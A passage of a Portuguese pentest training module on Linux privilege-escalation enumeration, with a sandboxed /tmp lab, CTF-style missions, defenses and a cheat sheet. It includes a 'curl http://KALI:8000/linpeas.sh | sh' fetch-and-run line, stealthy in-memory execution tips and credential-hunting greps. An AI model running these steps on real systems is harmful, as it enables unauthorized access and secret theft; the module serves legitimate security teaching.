+mkdir -p /tmp/enumtools && cd /tmp/enumtools
+curl -sL -o linpeas.sh https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
+curl -sL -o pspy64   https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64
+chmod +x linpeas.sh pspy64
+```
+
+Agora gere o cenário de treino. Cole o bloco inteiro de uma vez — ele cria a mesma árvore para todo mundo, com um segredo codificado, três candidatos a vetor e um "job" periódico:
+
+```bash
+ROOT=/tmp/privesc-enum
+rm -rf "$ROOT"; mkdir -p "$ROOT"/target/etc/app "$ROOT"/target/etc/cron.d "$ROOT"/target/opt/maint "$ROOT"/target/home/deploy
+
+# config legível por todos, com a senha do banco "escondida" em base64
+printf 'app:\n  name: billing-api\ndatabase:\n  host: 127.0.0.1\n  user: billing\n  db_password: RkxBR3tjcmVkLW5vLXlhbWwtd29ybGQtcmVhZGFibGV9\n' \
+  > "$ROOT/target/etc/app/config.yml"
+chmod 644 "$ROOT/target/etc/app/config.yml"
+
+# três "candidatos": só um é vetor real
+printf '#!/bin/sh\nfind /var/log/billing -name "*.log" -mtime +7 -delete\n' > "$ROOT/target/opt/maint/rotate-logs.sh"
+chmod 777 "$ROOT/target/opt/maint/rotate-logs.sh"          # gravável por todos  (candidato A)
+printf '#!/bin/sh\nmysqldump billing > /var/backups/billing.sql\n' > "$ROOT/target/opt/maint/backup-db.sh"
+chmod 755 "$ROOT/target/opt/maint/backup-db.sh"            # cron de root, mas NÃO gravável (chamariz)
+printf 'lembrar de pedir as credenciais de prod ao ops\n' > "$ROOT/target/home/deploy/notes.txt"
+chmod 666 "$ROOT/target/home/deploy/notes.txt"             # gravável, mas ninguém executa (chamariz)
+
+printf '# m h dom mon dow user  command\n*/2 *  *   *   *   root  /opt/maint/rotate-logs.sh\n30  3  *   *   *   root  /opt/maint/backup-db.sh\n' > "$ROOT/target/etc/cron.d/maint"
+chmod 644 "$ROOT/target/etc/cron.d/maint"
+
+# o "job periódico" que o pspy vai pegar (roda em segundo plano no SEU WSL)
+printf '#!/bin/sh\nsleep 3\n' > "$ROOT/target/opt/maint/healthcheck.sh"; chmod 755 "$ROOT/target/opt/maint/healthcheck.sh"
+printf '#!/bin/sh\nwhile true; do /tmp/privesc-enum/target/opt/maint/healthcheck.sh --token d4e9a1 >/dev/null 2>&1; sleep 4; done\n' > "$ROOT/start-job.sh"
+chmod 755 "$ROOT/start-job.sh"
+echo "Cenário pronto em $ROOT/target"
+```
+
+### 5.2 Missão 1 — A credencial no arquivo de configuração (guiada)
+
+Você é o `www-data` e quer credenciais. A primeira coisa: varrer a configuração à procura de segredos. Comece guiado:
+
+```console
+$ grep -R -n -iE 'pass|secret|token' /tmp/privesc-enum/target/etc 2>/dev/null
+/tmp/privesc-enum/target/etc/app/config.yml:5:  db_password: RkxBR3tjcmVkLW5vLXlhbWwtd29ybGQtcmVhZGFibGV9
+```
+
+Achou um `db_password`, mas o valor não é uma senha legível — alguém "escondeu". Esse disfarce é velho conhecido: não é criptografia, é **base64** (um jeito de representar bytes em texto, que você viu na Trilha 3). Qualquer um desfaz. Seu objetivo: recuperar a senha em claro. Ela, inteira, é a flag.
+
+<Hint title="Dica 1">
+O valor depois de `db_password:` está em base64. O comando que desfaz base64 é `base64 -d` (de *decode*). Você precisa passar **só** aquele valor para ele.
+</Hint>
+
+<Solution title="Solução">
+Pegue o valor e decodifique:
+
+```console
+$ grep db_password /tmp/privesc-enum/target/etc/app/config.yml | awk '{print $2}' | base64 -d; echo
+```
+
+O comando imprime a senha em claro no **seu** terminal — ela, inteira, é a flag que você envia no cartão (não vou repeti-la aqui para não entregar de graça). Lição: `base64` **não** é segurança — é só codificação. Guardar um segredo em base64 num arquivo legível por todos é o mesmo que guardá-lo em texto puro, só que com um passo a mais.
+</Solution>
+
+<FlagInput task="missao-1-credencial-no-config" />
+
+### 5.3 Missão 2 — O vetor no cruzamento (desafio)
+
+Agora a enumeração de verdade: achar o caminho para root. O cenário tem **três** coisas que parecem promissoras — um script gravável por todos, um script que o cron de root executa, e um arquivo gravável com um bilhete. Só **uma** é um vetor real. Lembre do 6.1: o vetor mora no **cruzamento** entre *o que você controla* e *o que algo privilegiado usa*.
+
+Seu trabalho: rodar as duas enumerações (arquivos graváveis por outros, e o cron) e achar o arquivo que aparece nas duas listas.
+
+<Hint title="Dica 1 — as duas listas">
+Arquivos graváveis por qualquer um (o bit de escrita para "outros"):
+
+```console
+$ find /tmp/privesc-enum/target -type f -perm -o+w 2>/dev/null
+```
+
+E o que o cron roda como root:
+
+```console
+$ grep -R 'root' /tmp/privesc-enum/target/etc/cron.d
+```
+
+Agora: qual arquivo está nas **duas**?
+</Hint>
+
+<Hint title="Dica 2 — elimine os chamarizes">
+- `notes.txt` é gravável, mas nenhum cron o executa → não é vetor (não é executável nem agendado).
+- `backup-db.sh` é executado pelo cron de root, mas o `ls -l` mostra `-rwxr-xr-x` (755) → você **não** pode reescrevê-lo.
+- Sobra um: gravável por todos **e** rodado pelo root.
+</Hint>
+
+<Solution title="Solução">
+O vetor é o `rotate-logs.sh`:
+
+```console
+$ ls -l /tmp/privesc-enum/target/opt/maint/rotate-logs.sh
+-rwxrwxrwx 1 voce voce 63 ... /tmp/privesc-enum/target/opt/maint/rotate-logs.sh
+$ grep rotate-logs /tmp/privesc-enum/target/etc/cron.d/maint
+*/2 *  *   *   *   root  /opt/maint/rotate-logs.sh
+```
+
+Ele é `-rwxrwxrwx` — modo **777**, <GlossaryTerm term="world-writable">world-writable</GlossaryTerm> (gravável por qualquer um) — **e** o cron o executa **como root** a cada 2 minutos. Num alvo real, você reescreveria o `rotate-logs.sh` com o que quisesse e esperaria no máximo 2 minutos pelo root rodá-lo (é o que o 6.3 faz). Aqui, basta identificá-lo.
+
+A flag junta, nessa ordem, o **basename** do script, o **usuário** que o cron usa e o **octal** do modo que o torna gravável por todos — no formato `FLAG{nome.sh-usuario-NNN}`.
+</Solution>
+
+<FlagInput task="missao-2-vetor-no-cruzamento" />
+
+### 5.4 Missão 3 — O processo que o crontab esconde (desafio)
+
+Há um job periódico rodando como parte do cenário, mas o `crontab -l` do seu usuário não o mostra — ele não está no *seu* crontab. Você vai pegá-lo com o pspy. Primeiro, ligue o job em segundo plano e confirme que o `crontab -l` não vê nada:
+
+```console
+$ setsid /tmp/privesc-enum/start-job.sh >/dev/null 2>&1 &
+$ crontab -l
+no crontab for voce
+```
+
+Agora rode o pspy e observe. O job roda de poucos em poucos segundos e carrega um `--token` na linha de comando — esse token é o miolo da flag.
+
+<Hint title="Dica 1">
+```console
+$ /tmp/enumtools/pspy64
+```
+Deixe uns 20 segundos. Procure as linhas que começam com `CMD:` e contêm `healthcheck.sh`. O valor depois de `--token` é o que você quer.
+</Hint>
+
+<Solution title="Solução">
+O pspy mostra o processo que o `ps` pontual quase sempre perde:
+
+```console
+$ /tmp/enumtools/pspy64
+...
+2026/01/10 14:13:04 CMD: UID=1000 PID=47218 | /bin/sh /tmp/privesc-enum/target/opt/maint/healthcheck.sh --token d4e9a1
+```
+
+O token é o valor depois de `--token` (aqui, `d4e9a1`). Monte a flag no formato que o cartão pede, `FLAG{pspy-cron-oculto-TOKEN}`, trocando `TOKEN` pelo que você leu. Lição: o pspy revelou um processo periódico que não estava no seu crontab e que um `ps` só pegaria por sorte — exatamente como você descobriria um cron de root num alvo real.
+
+Quando terminar, pare o job (ele está rodando em segundo plano):
+
+```console
+$ pkill -f start-job.sh
+```
+</Solution>
+
+<FlagInput task="missao-3-pspy-cron-oculto" />
+
+### 5.5 Limpar
+
+O cenário vive todo em `/tmp` e não tocou no seu sistema. Para apagar (e garantir que o job parou):
+
+```console
+$ pkill -f start-job.sh 2>/dev/null; rm -rf /tmp/privesc-enum /tmp/enumtools
+```
+
+## 6. Variações e aprofundamento
+
+**Grupos que são atalhos.** O primeiro `id` às vezes já entrega o jogo. Estar no grupo `docker` significa poder falar com o <GlossaryTerm term="docker.sock">docker.sock</GlossaryTerm> e subir um contêiner que monta o disco do host — root em um comando. O grupo `lxd`/`lxc` é equivalente. O grupo `sudo` (ou `wheel`) significa que falta só a senha. Um `id` nunca é "só contexto": leia os grupos com atenção.
+
+**"Estou num contêiner?"** Vale sempre perguntar, porque muda o que você enumera a seguir. Sinais rápidos: o arquivo `/.dockerenv` existe; `cat /proc/1/cgroup` menciona `docker` ou `lxc`; o `/proc/1/cmdline` não é o `init`/`systemd` de sempre. Se você está num contêiner, lembre do 6.1: root ali **não** é root no host — escapar é outra escalação.
+
+**Enumeração "às cegas", sem ferramenta.** Nem sempre dá para subir o LinPEAS. Um bom pentester sabe enumerar só com o que o `bash` oferece: `for d in $(echo $PATH | tr ':' ' '); do ls -la $d; done` para achar binários graváveis no `PATH`, laços de `grep` pelos configs, leitura direta de `/proc`. É o mesmo living off the land da transferência — e às vezes o único caminho.
+
+**Além do LinPEAS.** Há outros enumeradores — o `LinEnum`, o `linuxprivchecker`, o `linux-smart-enumeration` (`lse.sh`, que tem níveis de verbosidade). Fazem a mesma coisa com ênfases diferentes; conhecer dois ou três ajuda a não depender de um só. E o `linux-exploit-suggester`, que você viu, é o especialista da parte de kernel.
+
+**Enumeração contínua.** Enumerar não é um evento único no começo. Toda vez que você muda de nível (virou outro usuário, entrou em outro host), **enumera de novo** — o terreno é outro. O funil da seção 2.1 roda em loop a cada degrau, até o topo.
+
+## 7. Erros comuns
+
+- **Esquecer o `2>/dev/null`.** A saída se enche de `Permission denied` e você jura que "não achou nada". Quase todo comando de varredura (`find`, `getcap -r`, `grep -R`) precisa dele.
+- **Rodar o LinPEAS e olhar só o vermelho.** O `RED/YELLOW` é o começo, não o fim. O vetor campeão (cron + script gravável) costuma estar partido entre duas seções que nenhuma cor conecta. Leia a saída inteira, com o `tee` ajudando.
+- **Enumerar num shell não-interativo.** Sem `Tab`, sem `Ctrl-C`, e o `sudo` recusa rodar. Estabilize o <GlossaryTerm term="TTY">TTY</GlossaryTerm> (`python3 -c 'import pty; pty.spawn("/bin/bash")'`) **antes** de perder meia hora achando que a máquina está quebrada.
+- **`find` sem `-type f`.** Você pede arquivos SUID e vem um monte de diretório junto. `-type f` (e `-type d` quando quer pastas) mantém a lista limpa.
+- **Confiar no `linux-exploit-suggester` cegamente.** "probable" não é "funciona". Baixar e rodar um kernel exploit sem confirmar a versão exata é como atirar no escuro — e pode derrubar a máquina (péssimo num teste autorizado).
+- **Baixar a ferramenta para o disco num alvo monitorado.** Gravar o `linpeas.sh` em `/tmp` deixa artefato. Quando o OPSEC importa, rode da memória (`curl ... | sh`) ou enumere à mão.
+- **Parar no primeiro `sudo -l` vazio.** `sudo -l` sem nada não quer dizer "não dá para escalar" — quer dizer "este caminho está fechado". Faltam sete superfícies para olhar.
+
+## 8. Defesa e mitigação
+
+A enumeração é barata para o atacante justamente porque o sistema revela demais. A defesa trabalha em duas frentes: **reduzir o que a máquina conta** e **detectar quem está perguntando**.
+
+**Reduzir o que a enumeração revela:**
+
+- **Esconda os processos dos outros.** Montar o `/proc` com a opção `hidepid=2` (via `/etc/fstab` ou um serviço do systemd) faz cada usuário ver só os **próprios** processos. Isso cega de uma vez o `ps` do atacante, o `/proc/<PID>/cmdline` de root e boa parte do que o pspy capturaria — uma das defesas de maior retorno contra enumeração.
+- **Tire os segredos dos lugares legíveis.** Credencial não mora em arquivo de config `world-readable`, em variável de ambiente nem em base64 (que não esconde nada). Use um cofre (*secrets manager*), permissões restritas (`chmod 600`, dono certo) e, na nuvem, o IMDSv2 (<GlossaryTerm term="instance metadata service">instance metadata service</GlossaryTerm> v2), que fecha o acesso trivial que o TeamTNT explorava. Limpe segredos do `.bash_history`.
+- **Enxugue as superfícies.** Menos SUID (`find / -perm -4000` e tire o bit do que não precisa), `sudoers` específico, capabilities no lugar de root, nenhum arquivo de sistema `world-writable` (`find / -perm -2 ! -type l`) — tudo isso, do 6.1, também **encolhe o que a enumeração encontra**.
+
+**Detectar a enumeração:**
+
+- **`auditd`.** O audit framework do Linux registra execuções e acessos a arquivos. Regras que alertam para execução de binários de enumeração conhecidos, leitura em massa de `/etc`, ou acesso a `/etc/shadow` pegam tanto o LinPEAS (barulhento) quanto a varredura manual. Ferramentas comerciais de detecção (EDR) já trazem regras prontas — por exemplo, alertar quando um `sudo -l` parte de um shell de serviço, um padrão que o MITRE ATT&CK classifica como *Discovery*.
+- **O limite do pspy.** O pspy é desenhado para ser passivo e silencioso, então é mais difícil de pegar que o LinPEAS. Mas o `hidepid=2` corta o que ele vê, e um `auditd` bem configurado ainda registra os processos que o cron de root cria — o defensor observa de cima, com privilégio, o que o atacante tenta ver de baixo.
+
+<Callout variant="info" title="A mesma assimetria, agora a favor do defensor">
+O atacante precisa que **uma** informação vaze para achar o vetor. O defensor que liga o `hidepid=2`, tira os segredos dos arquivos, enxuga os SUID e monitora com `auditd` obriga o atacante a enumerar no escuro — e deixa rastro quando ele tenta. Não existe "esconder tudo", mas cada superfície fechada é um degrau a menos e um alarme a mais.
+</Callout>
+
+## 9. Exercícios
+
+Responda ao quiz (ele conta para concluir o módulo) e, para fixar, encare os dois cenários depois.
+
+<Quiz task="quiz-final" />
+
+### Cenários para pensar (sem flag)
+
+1. **Você enumerou um alvo, o `sudo -l` veio vazio, a lista de SUID é toda padrão e o kernel está atualizado.** Antes de concluir "não dá para escalar", quais superfícies você ainda não olhou? Liste pelo menos quatro (dica: releia o funil da seção 2.1) e diga qual ferramenta/comando cobre cada uma.
+
+2. **Num engajamento com cláusula de "não ser detectado", você está decidindo entre jogar o LinPEAS ou enumerar à mão.** Quais fatores pesam na decisão? Em que situação o barulho do LinPEAS é aceitável, e em qual ele quebraria a operação? Como o pspy se encaixa nesse meio-termo?
+
+## 10. Resumo e glossário
+
+**Pontos-chave:**
+
+- Enumerar é arrancar da máquina tudo que ela revela, e é a etapa que mais separa quem escala de quem desiste. Vem **antes** de explorar, e funciona porque o Linux torna legível por padrão quase tudo que não é segredo.
+- O arsenal manual cobre as superfícies uma a uma (contexto, SUID/SGID, `sudo`, capabilities, cron/timers, graváveis, credenciais, kernel, rede), sempre com `2>/dev/null` para calar o ruído.
+- As ferramentas aceleram: o **LinPEAS** varre tudo e colore (`RED/YELLOW` = ~95% um vetor, pela legenda dele), ao custo de ser barulhento; o **pspy** revela processos e cron de outros usuários sem root; o **linux-exploit-suggester** sugere kernel exploits (pistas, não verdades).
+- No alvo sem internet, você serve a ferramenta da Kali e a puxa com `curl`/`wget` ou com o `/dev/tcp` do `bash` — e pode rodá-la da memória.
+- O vetor real vive no **cruzamento** entre o que você controla e o que tem poder; a triagem usa as quatro classes do 6.1 e prioriza por confiabilidade, ruído e estabilidade.
+- A defesa reduz o que a enumeração revela (`hidepid=2`, segredos fora de arquivos legíveis, superfícies enxutas) e detecta quem pergunta (`auditd`, EDR).
+
+### Cola rápida
+
+```text
+# contexto
+id ; hostname ; cat /etc/os-release ; uname -a ; cat /proc/version
+# superfícies clássicas (sempre com 2>/dev/null)
+sudo -l
+find / -perm -4000 -type f 2>/dev/null        # SUID   (-2000 = SGID)
+getcap -r / 2>/dev/null                        # capabilities
+cat /etc/crontab ; ls -la /etc/cron.d/ ; systemctl list-timers --all
+find / -writable -type f 2>/dev/null | grep -vE '^/(proc|sys)'
+grep -RiE 'password|secret|api[_-]?key' /etc /var/www 2>/dev/null
+cat ~/.bash_history ; env ; ss -tlnp
+# ferramentas
+./linpeas.sh | tee /tmp/linpeas.txt            # RED/YELLOW primeiro
+./pspy64                                       # cron/processos sem root
+./linux-exploit-suggester.sh                   # candidatos de kernel
+# transferir sem internet (na Kali: python3 -m http.server 8000)
+curl http://KALI:8000/linpeas.sh | sh
+```
+
+### Termos deste módulo
+
+<ModuleGlossary />
+
+### Para ir além
+
+- [PEASS-ng (LinPEAS e WinPEAS)](https://github.com/peass-ng/PEASS-ng) — o projeto dos enumeradores, com a documentação da legenda de cores.
+- [pspy](https://github.com/DominicBreuker/pspy) — a ferramenta de ver processos sem root, com a explicação do inotify + procfs.
+- [linux-exploit-suggester](https://github.com/The-Z-Labs/linux-exploit-suggester) — o sugeridor de kernel exploits.
+- [HackTricks — Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation) — a checklist de enumeração mais completa da área, seção por seção.
+- [`proc(5)` — man pages do Linux](https://man7.org/linux/man-pages/man5/proc.5.html) — o que cada arquivo de `/proc` entrega.
